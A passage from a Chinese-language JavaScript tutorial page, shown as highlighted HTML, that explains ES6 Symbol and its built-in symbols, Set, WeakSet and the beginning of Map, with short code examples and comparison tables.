function_">for</span>(<span class="hljs-string">&#x27;global_key&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">keyFor</span>(globalSym)); <span class="hljs-comment">// &quot;global_key&quot;</span><br><br><span class="hljs-comment">// 跨模块访问</span><br><span class="hljs-comment">// module1.js</span><br><span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>);<br><br><span class="hljs-comment">// module2.js</span><br><span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>) === <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;shared&#x27;</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="核心特性"><a href="#核心特性" class="headerlink" title="核心特性"></a>核心特性</h2><p><strong>唯一性</strong></p><p>每个 Symbol 的值都是唯一的，即使它们有相同的描述</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> s1 = <span class="hljs-title class_">Symbol</span>();<br><span class="hljs-keyword">const</span> s2 = <span class="hljs-title class_">Symbol</span>();<br>s1 === s2 <span class="hljs-comment">// false</span><br><br><span class="hljs-keyword">const</span> s3 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;desc&#x27;</span>);<br><span class="hljs-keyword">const</span> s4 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;desc&#x27;</span>);<br>s3 === s4 <span class="hljs-comment">// false（即使描述相同）</span><br></code></pre></td></tr></table></figure><p><strong>值不可修改</strong></p><p>Symbol 值一旦创建不可被修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> sym = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;unique&#x27;</span>);<br><span class="hljs-comment">// 没有任何方法可以改变 sym 的值</span><br>sym.<span class="hljs-property">description</span> = <span class="hljs-string">&#x27;changed&#x27;</span>; <span class="hljs-comment">// 静默失败（非严格模式）</span><br></code></pre></td></tr></table></figure><p><strong>不可枚举性</strong></p><p>当使用 Symbol 值作为对象属性键时，默认情况下常规方法（如 <code>for...in</code>，<code>Object.keys()</code>）中不可见，但可以通过 <code>Object.getOwnPropertySymbols()</code> 和 <code>Reflect.ownKeys()</code> 获取</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;key&#x27;</span>)]: <span class="hljs-string">&#x27;value&#x27;</span>,<br>  <span class="hljs-attr">normalKey</span>: <span class="hljs-string">&#x27;normal&#x27;</span><br>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 只输出 &quot;normalKey&quot;</span><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)); <span class="hljs-comment">// [&quot;normalKey&quot;]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj)); <span class="hljs-comment">// &#123;&quot;normalKey&quot;:&quot;normal&quot;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>特殊运算</strong></p><p>Symbol 类型的值不能与其他类型的值进行运算，会报错，但 Symbol 值可以转为字符串和布尔值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> s = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>s + <span class="hljs-string">&#x27;world&#x27;</span> <span class="hljs-comment">// TypeError: can&#x27;t convert a Symbol value to a string</span><br><span class="hljs-string">`<span class="hljs-subst">$&#123;s&#125;</span> world`</span> <span class="hljs-comment">// TypeError: can&#x27;t convert a Symbol value to a string</span><br><span class="hljs-title class_">Number</span>(s) <span class="hljs-comment">// TypeError: Cannot convert a Symbol value to a number</span><br>s + <span class="hljs-number">2</span> <span class="hljs-comment">// TypeError: Cannot convert a Symbol value to a number</span><br></code></pre></td></tr></table></figure><h2 id="内置的-Symbol-值"><a href="#内置的-Symbol-值" class="headerlink" title="内置的 Symbol 值"></a>内置的 Symbol 值</h2><p>JavaScript 内置的 Symbol 属性可以用于修改语言的内部行为</p><p><strong>Symbol.hasInstance - 自定义 instanceof 行为</strong></p><p>对象的 Symbol.hasInstance 属性指向一个内部方法，当其他对象使用 instanceof 运算符判断是否为该对象的实例时，就会调用这个内部方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObj</span> &#123;<br>  <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](obj) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) === <span class="hljs-string">&#x27;[object Number]&#x27;</span><br>  &#125;<br>&#125;<br><br><span class="hljs-number">1</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyObj</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;<br>obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyObj</span> <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.iterator - 定义对象的默认迭代器</strong></p><p>对象的 Symbol.iterator 属性指向该对象的默认遍历器方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">[...&#123; [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]: <span class="hljs-keyword">function</span>*() &#123; <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>; <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>; &#125; &#125;] <span class="hljs-comment">// [1, 2]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.toStringTag - 定制 Object.prototype.toString</strong></p><p>对象的 Symbol.toStringTag 属性用来设定一个字符串，当其他对象调用 Object.prototype.toString 判断类型时，如果 Symbol.toStringTag 属性存在，则该属性设定的字符串会出现在 toString 方法返回的字符串中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomClass</span> &#123;<br>  get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Custom&#x27;</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">let</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomClass</span>()<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) <span class="hljs-comment">// [object Custom]</span><br><br>(&#123; [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]: <span class="hljs-string">&#x27;Custom&#x27;</span> &#125;).<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// [object Custom]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol.species - 指定衍生对象的构造函数</strong></p><p>对象的 Symbol.species 属性指向一个构造函数，当创建衍生对象时，会使用该属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-keyword">static</span> get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyArray</span>();<br><span class="hljs-keyword">const</span> b = a.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x);<br><br>b <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-comment">// false</span><br>b <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>由于创建 MyArray 时使用了 Symbol.species 属性，因此会使用 Symbol.species 返回的函数作为构造函数，衍生对象 b 就不是 MyArray 的实例</p><p><strong>Symbol.match - 定制字符串匹配行为</strong></p><p>对象的 Symbol.match 属性指向一个函数，当执行 str.match(MyObj)，如果 MyObj 存在该属性，会调用该属性指向的函数，并将函数的返回值作为 str.match(MyObj) 的返回值</p><p>默认行为中，regex[Symbol.match] 指向 RegExp 内置的匹配方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/foo/</span>;<br><span class="hljs-string">&#x27;foobar&#x27;</span>.<span class="hljs-title function_">match</span>(regex); <span class="hljs-comment">// [&quot;foo&quot;, index: 0, input: &quot;foobar&quot;]</span><br></code></pre></td></tr></table></figure><p>通过 Symbol.match 属性可以让任何对象成为合法的 match 参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> customMatcher = &#123;<br>  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">match</span>](str) &#123;<br>    <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;hello&#x27;</span>) ? <br>      [<span class="hljs-string">&#x27;匹配成功&#x27;</span>] : <br>      <span class="hljs-literal">null</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-string">&#x27;world hello&#x27;</span>.<span class="hljs-title function_">match</span>(customMatcher); <span class="hljs-comment">// [&quot;匹配成功&quot;]</span><br><span class="hljs-string">&#x27;no match&#x27;</span>.<span class="hljs-title function_">match</span>(customMatcher);    <span class="hljs-comment">// null</span><br></code></pre></td></tr></table></figure><p>此外，还有 Symbol.replace、Symbol.search、Symbol.split 等属性，都是用于定制 String 对应的方法</p><h2 id="Symbol-与相关技术对比"><a href="#Symbol-与相关技术对比" class="headerlink" title="Symbol 与相关技术对比"></a>Symbol 与相关技术对比</h2><table><thead><tr><th align="left">特性</th><th align="left">Symbol</th><th align="left">字符串属性</th><th align="left">WeakMap</th></tr></thead><tbody><tr><td align="left">唯一性</td><td align="left">唯一</td><td align="left">不唯一</td><td align="left">唯一（键为对象）</td></tr><tr><td align="left">可枚举性</td><td align="left">不可枚举（默认）</td><td align="left">可枚举</td><td align="left">N&#x2F;A</td></tr><tr><td align="left">内存管理</td><td align="left">全局注册 Symbol 需手动管理</td><td align="left">自动回收</td><td align="left">可被 GC 垃圾回收</td></tr><tr><td align="left">私有性</td><td align="left">弱私有（反射可获取）</td><td align="left">完全公开</td><td align="left">强私有</td></tr><tr><td align="left">适用场景</td><td align="left">协议实现&#x2F;防冲突</td><td align="left">常规数据存储</td><td align="left">真正私有数据存储</td></tr></tbody></table><h2 id="Symbol-的核心价值"><a href="#Symbol-的核心价值" class="headerlink" title="Symbol 的核心价值"></a>Symbol 的核心价值</h2><ul><li>提供真正唯一的标识符，解决命名冲突问题</li><li>实现 JavaScript 内置协议（如迭代协议）</li><li>支持元编程，改变语言内部行为</li><li>为对象提供弱封装能力（非完全私有）</li></ul><h1 id="ES6-Set-和-Map-结构"><a href="#ES6-Set-和-Map-结构" class="headerlink" title="ES6+ Set 和 Map 结构"></a>ES6+ Set 和 Map 结构</h1><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><h3 id="Set-的定义和基本用法"><a href="#Set-的定义和基本用法" class="headerlink" title="Set 的定义和基本用法"></a>Set 的定义和基本用法</h3><p>Set 是 ES6 引入的新的数据结构，是一种集合类型，类似于数组，但成员的值是唯一的，没有重复成员。Set 本身是一个构造函数，用于生成 Set 数据结构。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()<br></code></pre></td></tr></table></figure><p>Set()函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>])<br></code></pre></td></tr></table></figure><h3 id="Set-的核心特性"><a href="#Set-的核心特性" class="headerlink" title="Set 的核心特性"></a>Set 的核心特性</h3><p><strong>唯一性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2 (1 和 &#x27;1&#x27; 是不同的值)</span><br></code></pre></td></tr></table></figure><p>唯一性判断采用 <code>SameValueZero</code> 算法：</p><ul><li>NaN 被视为相等</li><li>+0 和 -0 被视为相等</li><li>对象引用比较（不同对象即使内容相同也被视为不同）</li></ul><p>根据该特性可以实现数组去重：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 去除数组的重复成员</span><br>[...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(array)]<br></code></pre></td></tr></table></figure><p><strong>值类型支持</strong></p><p>Set 数据结构可以存储任意类型的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<br>  <span class="hljs-number">1</span>, <br>  <span class="hljs-string">&#x27;text&#x27;</span>,<br>  &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;obj&#x27;</span>&#125;,<br>  [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],<br>  <span class="hljs-title class_">NaN</span>,<br>  <span class="hljs-literal">undefined</span>,<br>  <span class="hljs-literal">null</span><br>]);<br></code></pre></td></tr></table></figure><h3 id="Set-的基础-API-详解"><a href="#Set-的基础-API-详解" class="headerlink" title="Set 的基础 API 详解"></a>Set 的基础 API 详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new Set(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">set.has(value)</td><td align="left">检查值是否存在</td></tr><tr><td align="left">set.add(value)</td><td align="left">添加值</td></tr><tr><td align="left">set.delete(value)</td><td align="left">删除值</td></tr><tr><td align="left">set.clear(value)</td><td align="left">清空集合</td></tr><tr><td align="left">set.size</td><td align="left">获取 Set 实例的成员数量（非函数属性，不能 set.size()）</td></tr></tbody></table><h3 id="Set-的迭代操作"><a href="#Set-的迭代操作" class="headerlink" title="Set 的迭代操作"></a>Set 的迭代操作</h3><p>Set 结构的实例有四个迭代方法，用于遍历成员：</p><ul><li>set.values()：返回键值的遍历器</li><li>set.keys()：返回键名的遍历器</li><li>set.entries()：返回键值对的遍历器</li><li>set.forEach()：使用回调函数变量成员</li></ul><p>Set 实例的遍历顺序就是成员插入的顺序，该特性可以用于保证回调函数列表的执行顺序。Set 结构实例的默认遍历器生成函数就是它的 values()方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>]);<br><br><span class="hljs-comment">// 1. for...of</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> set) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item);<br>&#125;<br><br><span class="hljs-comment">// 2. forEach</span><br>set.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, valueAgain</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value); <span class="hljs-comment">// 注意：两个参数相同</span><br>&#125;);<br><br><span class="hljs-comment">// 3. 获取迭代器</span><br><span class="hljs-keyword">const</span> iterator = set.<span class="hljs-title function_">values</span>(); <span class="hljs-comment">// 或 set[Symbol.iterator]()</span><br></code></pre></td></tr></table></figure><h3 id="Set-的高级特性与应用"><a href="#Set-的高级特性与应用" class="headerlink" title="Set 的高级特性与应用"></a>Set 的高级特性与应用</h3><p><strong>性能优势</strong></p><p>Set 的查找性能远优于数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 数组 vs Set 查找性能对比</span><br><span class="hljs-keyword">const</span> arr = [<span class="hljs-comment">/* 10,000 个元素 */</span>];<br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Array&#x27;</span>);<br>arr.<span class="hljs-title function_">includes</span>(<span class="hljs-number">9999</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Array&#x27;</span>); <span class="hljs-comment">// ~0.1ms</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Set&#x27;</span>);<br>set.<span class="hljs-title function_">has</span>(<span class="hljs-number">9999</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Set&#x27;</span>); <span class="hljs-comment">// ~0.005ms</span><br></code></pre></td></tr></table></figure><p><strong>集合运算实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 并集</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">union</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA, ...setB]);<br>&#125;<br><br><span class="hljs-comment">// 交集</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">intersection</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> setB.<span class="hljs-title function_">has</span>(x)));<br>&#125;<br><br><span class="hljs-comment">// 差集</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">difference</span>(<span class="hljs-params">setA, setB</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([...setA].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> !setB.<span class="hljs-title function_">has</span>(x)));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>对象引用管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> users = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trackUser</span>(<span class="hljs-params">user</span>) &#123;<br>  users.<span class="hljs-title function_">add</span>(user);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">untrackUser</span>(<span class="hljs-params">user</span>) &#123;<br>  users.<span class="hljs-title function_">delete</span>(user);<br>&#125;<br><br><span class="hljs-comment">// 自动去重：同一对象不会被重复添加</span><br></code></pre></td></tr></table></figure><h3 id="Set-的实现原理"><a href="#Set-的实现原理" class="headerlink" title="Set 的实现原理"></a>Set 的实现原理</h3><p>现代 JavaScript 引擎通常使用：</p><ul><li>哈希表作为底层实现</li><li>使用 开放寻址法 或 链表法 解决冲突</li><li>自动扩容机制（类似 Map）</li></ul><h2 id="WeakSet"><a href="#WeakSet" class="headerlink" title="WeakSet"></a>WeakSet</h2><h3 id="WeakSet-的定义"><a href="#WeakSet-的定义" class="headerlink" title="WeakSet 的定义"></a>WeakSet 的定义</h3><p>WeakSet 是 ES6 引入的一种特殊集合类型，与 Set 类似，也是不重复的值的集合。</p><h3 id="WeakSet-的核心特性"><a href="#WeakSet-的核心特性" class="headerlink" title="WeakSet 的核心特性"></a>WeakSet 的核心特性</h3><p><strong>成员类型限制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// WeakSet 的成员只能是对象和 Symbol 值，不能是其他类型的值</span><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br>ws.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 报错</span><br>ws.<span class="hljs-title function_">add</span>(<span class="hljs-title class_">Symbol</span>()) <span class="hljs-comment">// 不报错</span><br></code></pre></td></tr></table></figure><p><strong>弱引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;important&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> weakset = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br><br>weakset.<span class="hljs-title function_">add</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakset.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 当对象不再被引用时</span><br>obj = <span class="hljs-literal">null</span>; <br><br><span class="hljs-comment">// 垃圾回收后，对象会自动从WeakSet移除</span><br><span class="hljs-comment">// weakset.has(原obj) 将返回 false</span><br></code></pre></td></tr></table></figure><p><strong>不可遍历</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br>ws.<span class="hljs-title function_">add</span>(&#123;&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-property">size</span>); <span class="hljs-comment">// undefined (无size属性)</span><br><br><span class="hljs-comment">// 以下操作都会报错：</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> item <span class="hljs-keyword">of</span> ws) &#123;&#125;<br>ws.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;)<br>[...ws]<br></code></pre></td></tr></table></figure><h3 id="WeakSet-的-API-详解"><a href="#WeakSet-的-API-详解" class="headerlink" title="WeakSet 的 API 详解"></a>WeakSet 的 API 详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new WeakSet(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">weakSet.has(value)</td><td align="left">检查值是否存在</td></tr><tr><td align="left">weakSet.add(value)</td><td align="left">添加值</td></tr><tr><td align="left">weakSet.delete(value)</td><td align="left">删除值</td></tr></tbody></table><p>WeakSet 没有 size 属性，不可遍历（即没有keys()、values()和entries()方法），因为成员都是弱引用，随时都可能消失。WeakSet 也没有 clear() 方法。</p><h3 id="WeakSet-和-Set-的区别"><a href="#WeakSet-和-Set-的区别" class="headerlink" title="WeakSet 和 Set 的区别"></a>WeakSet 和 Set 的区别</h3><table><thead><tr><th align="left">特性</th><th align="left">Set</th><th align="left">WeakSet</th></tr></thead><tbody><tr><td align="left">成员类型</td><td align="left">任意类型</td><td align="left">仅对象和 Symbol</td></tr><tr><td align="left">可枚举性</td><td align="left">可遍历</td><td align="left">不可遍历</td></tr><tr><td align="left">引用类型</td><td align="left">强引用</td><td align="left">弱引用</td></tr><tr><td align="left">自动清理</td><td align="left">否</td><td align="left">是</td></tr></tbody></table><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="Map-的定义和基本用法"><a href="#Map-的定义和基本用法" class="headerlink" title="Map 的定义和基本用法"></a>Map 的定义和基本用法</h3><p>Map 是 ES6 引入的新的数据结构，是一种键值对集合类型（Hash结构），使用 new 关键字创建 Map 结构实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> m = <span 